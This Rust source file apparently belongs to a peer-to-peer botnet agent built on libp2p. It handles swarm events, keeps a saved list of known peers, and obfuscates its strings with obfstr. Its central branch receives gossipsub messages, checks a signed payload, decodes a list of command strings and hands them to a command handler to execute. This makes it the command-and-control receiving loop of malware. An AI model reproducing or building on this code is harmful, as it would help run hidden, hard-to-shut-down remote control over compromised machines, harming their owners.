use anyhow::{anyhow, Result};
use libp2p::{
  gossipsub, identify, kad,
  swarm::{DialError, SwarmEvent},
  Swarm,
};
use log::{info, warn};
use obfstr::obfstr;

use crate::{payload::Payload, storage::Storage};

use super::{
  behavior::{Behavior, BehaviorEvent},
  commands::CommandHandler,
};

pub async fn handle_event(swarm: &mut Swarm<Behavior>, storage: &mut Storage, command_handler: &mut CommandHandler, event: SwarmEvent<BehaviorEvent>) -> Result<()> {
  info!("{event:?}");

  match event {
    /* built-in swarm events */
    SwarmEvent::ExternalAddrConfirmed { .. } => swarm.behaviour_mut().kademlia.set_mode(Some(kad::Mode::Server)),

    SwarmEvent::ExternalAddrExpired { .. } => swarm.behaviour_mut().kademlia.set_mode(Some(kad::Mode::Client)),

    SwarmEvent::NewExternalAddrOfPeer { peer_id, address } => {
      let address = address.with_p2p(peer_id).map_err(|_| anyhow!("{}", obfstr!("Failed to construct peer-to-peer multiaddress")))?;

      if !storage.known_addresses.iter().any(|addr| addr == &address) {
        storage.known_addresses.push(address);
        storage.save().await?;
      }
    }

    SwarmEvent::OutgoingConnectionError { error, .. } => {
      if let DialError::Transport(errors) = error {
        let failed_addresses: Vec<_> = errors.iter().map(|(address, _)| address).collect();
        storage.known_addresses.retain(|address| !failed_addresses.contains(&address));
        storage.save().await?;
      }
    }

    /* Gossipsub events */
    SwarmEvent::Behaviour(BehaviorEvent::Gossipsub(gossipsub::Event::Message { message, .. })) => {
      let payload = match Payload::from_slice(&message.data) {
        Ok(payload) => payload,
        Err(_) => {
          warn!("Failed to decode payload from message.");
          return Ok(());
        }
      };

      if !payload.verify() {
        warn!("Failed to verify signature for payload.");
        return Ok(());
      }

      let command: Vec<String> = match bincode::decode_from_slice(&payload.body, bincode::config::standard()) {
        Ok((command, _)) => command,
        Err(_) => {
          warn!("Failed to decode command from payload.");
          return Ok(());
        }
      };

      command_handler.execute_command(&command);
    }

    /* Identify events */
    SwarmEvent::Behaviour(BehaviorEvent::Identify(identify::Event::Received { info, .. })) => swarm.behaviour_mut().gossipsub.add_explicit_peer(&info.public_key.to_peer_id()),

    _ => {}
  }

  Ok(())
}
